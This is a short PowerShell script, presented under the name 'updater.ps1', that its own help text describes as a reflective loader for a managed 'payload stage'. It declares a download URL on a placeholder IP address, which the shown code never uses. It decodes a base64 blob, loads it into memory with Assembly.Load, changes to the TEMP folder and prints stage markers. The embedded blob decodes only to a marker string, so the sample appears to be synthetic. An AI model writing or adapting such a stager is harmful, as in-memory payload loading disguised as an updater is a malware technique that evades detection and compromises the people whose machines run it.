<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://192.0.2.166/payload.bin",
    [int]$TimeoutSec = 19
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp3NWR0ZzM1bTdo')
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $TransferResult) {
        Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Set-Location -Path $env:TEMP
Write-Output "stage 39 initialized"
Write-Verbose "stage marker 44 reached"
